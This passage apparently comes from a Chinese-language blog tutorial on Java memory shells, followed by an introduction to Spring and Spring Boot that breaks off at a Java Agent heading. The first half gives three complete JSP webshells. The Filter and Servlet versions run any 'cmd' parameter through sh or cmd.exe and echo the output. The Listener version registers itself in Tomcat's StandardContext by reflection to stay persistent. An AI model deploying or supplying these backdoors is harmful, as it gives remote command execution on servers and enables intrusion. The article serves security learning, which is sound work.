+</span></span></span></code></pre></div><h4 id="有回显的-filter-木马"><!-- raw HTML omitted -->有回显的 Filter 木马：<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#有回显的-filter-木马">#</a></h4>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.IOException&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.InputStream&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.util.Scanner&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;%!</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ShellFilter</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Filter</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">chain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="w"> </span><span class="n">request</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletResponse</span><span class="p">)</span><span class="w"> </span><span class="n">response</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">boolean</span><span class="w"> </span><span class="n">isLinux</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">osTyp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="s">&#34;os.name&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">osTyp</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">osTyp</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;win&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">isLinux</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">cmds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isLinux</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">)}</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;/c&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">)};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmds</span><span class="p">).</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Scanner</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Scanner</span><span class="p">(</span><span class="n">in</span><span class="p">).</span><span class="na">useDelimiter</span><span class="p">(</span><span class="s">&#34;\\A&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">hasNext</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">next</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">resp</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">write</span><span class="p">(</span><span class="n">output</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">resp</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">flush</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">FilterConfig</span><span class="w"> </span><span class="n">config</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">%&gt;</span><span class="w">
+</span></span></span></code></pre></div><h4 id="有回显的-servlet-木马">有回显的 Servlet 木马：<a hidden class="anchor" aria-hidden="true" href="#有回显的-servlet-木马">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.*&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;%!</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MemServlet</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">HttpServlet</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">message</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">message</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;Hello World!&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 计算机弹出</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// MemShell?cmd=whoami  任意命令执行</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">service</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">res</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">!=</span><span class="kc">null</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Process</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">InputStream</span><span class="w"> </span><span class="n">inputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">process</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">bufferedReader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">inputStream</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">String</span><span class="w"> </span><span class="n">line</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bufferedReader</span><span class="p">.</span><span class="na">readLine</span><span class="p">())</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">res</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">println</span><span class="p">(</span><span class="n">line</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">NullPointerException</span><span class="w"> </span><span class="n">n</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">n</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">%&gt;</span><span class="w">
+</span></span></span></code></pre></div><h4 id="无回显的-listener-木马">无回显的 Listener 木马：<a hidden class="anchor" aria-hidden="true" href="#无回显的-listener-木马">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Field&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.connector.Request&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.IOException&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;%--</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">Created</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">IntelliJ</span><span class="w"> </span><span class="n">IDEA</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">User</span><span class="p">:</span><span class="w"> </span><span class="n">XVSHIFU</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">Date</span><span class="p">:</span><span class="w"> </span><span class="n">2025</span><span class="o">/</span><span class="n">11</span><span class="o">/</span><span class="n">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">Time</span><span class="p">:</span><span class="w"> </span><span class="n">16</span><span class="p">:</span><span class="n">24</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">To</span><span class="w"> </span><span class="n">change</span><span class="w"> </span><span class="k">this</span><span class="w"> </span><span class="n">template</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">File</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Settings</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">File</span><span class="w"> </span><span class="n">Templates</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">--%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">contentType</span><span class="o">=</span><span class="s">&#34;text/html;charset=UTF-8&#34;</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s">&#34;java&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">Title</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;%!</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ShellListener</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">ServletRequestListener</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestInitialized</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="w"> </span><span class="n">sre</span><span class="p">.</span><span class="na">getServletRequest</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cmd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">NullPointerException</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">n</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">requestDestroyed</span><span class="p">(</span><span class="n">ServletRequestEvent</span><span class="w"> </span><span class="n">sre</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 1. 获取 StandardContext 类</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">reqF</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;request&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">reqF</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Request</span><span class="w"> </span><span class="n">req</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Request</span><span class="p">)</span><span class="w"> </span><span class="n">reqF</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">request</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">StandardContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getContext</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 2. 添加监听器</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ShellListener</span><span class="w"> </span><span class="n">shellListener</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ShellListener</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">context</span><span class="p">.</span><span class="na">addApplicationEventListener</span><span class="p">(</span><span class="n">shellListener</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">%&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span><span class="w">
+</span></span></span></code></pre></div><h2 id="5-spring-基础">5. Spring 基础<a hidden class="anchor" aria-hidden="true" href="#5-spring-基础">#</a></h2>
+<p><!-- raw HTML omitted -->总结一句话：Spring就是一个轻量级的控制反转（IOC）和面向切面编程（AOP）的框架<!-- raw HTML omitted --></p>
+<h3 id="51-什么是spring">5.1 什么是Spring<a hidden class="anchor" aria-hidden="true" href="#51-什么是spring">#</a></h3>
+<p>Spring是一个轻量级的Java开源框架，用于配置、管理和维护Bean（组件）的一种框架，其核心理念就是<strong>IoC(Inversion of Control,控制反转)</strong> 和 <strong>AOP(AspectOrientedProgramming， 面向切面编程)</strong>。现如今Spring全家桶已是一个庞大的家族</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509336.webp"></p>
+<p>Spring的出现大大简化了JavaEE的开发流程，减少了Java开发时各种繁琐的配置。</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508481.webp"></p>
+<p>Spring框架的核心之一就是分层，其由许多大大小小的组件构成，每种组件都实现不同功能。</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509118.webp"></p>
+<h3 id="52-springboot">5.2 SpringBoot<a hidden class="anchor" aria-hidden="true" href="#52-springboot">#</a></h3>
+<p><!-- raw HTML omitted -->Spring Boot 基于 Spring 开发，Spirng Boot 本身并不提供 Spring 框架的核心特性以及扩展功能，只是用于快速、敏捷地开发新一代基于 Spring 框架的应用程序。也就是说，它并不是用来替代 Spring 的解决方案，而是和 Spring 框架紧密结合用于提升 Spring 开发者体验的工具。Spring Boot 以<!-- raw HTML omitted --><strong><!-- raw HTML omitted -->约定大于配置的核心思想<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->，默认帮我们进行了很多设置，多数 Spring Boot 应用只需要很少的 Spring 配置。同时它集成了大量常用的第三方库配置（例如 Redis、MongoDB、Jpa、RabbitMQ、Quartz 等等），Spring Boot 应用中这些第三方库几乎可以零配置的开箱即用。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->简单来说就是SpringBoot其实不是什么新的框架，它默认配置了很多框架的使用方式，就像maven整合了所有的jar包，spring boot整合了所有的框架 。<!-- raw HTML omitted --></p>
+<p><strong><!-- raw HTML omitted -->Spring Boot的主要优点：<!-- raw HTML omitted --></strong></p>
+<ul>
+<li><!-- raw HTML omitted -->为所有Spring开发者更快的入门<!-- raw HTML omitted --></li>
+<li><strong><!-- raw HTML omitted -->开箱即用<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->，提供各种默认配置来简化项目配置<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->内嵌式容器简化Web项目<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->没有冗余代码生成和XML配置的要求<!-- raw HTML omitted --></li>
+</ul>
+<h2 id="6-java-agent">6. java Agent<a hidden class="anchor" aria-hidden="true" href="#6-java-agent">#</a></h2>
+<h3 id="61-什么是java-agent">6.1 什么是Java Agent？<a hidden class="anchor" aria-hidden="true" href="#61-什么是java-agent">#</a></h3>
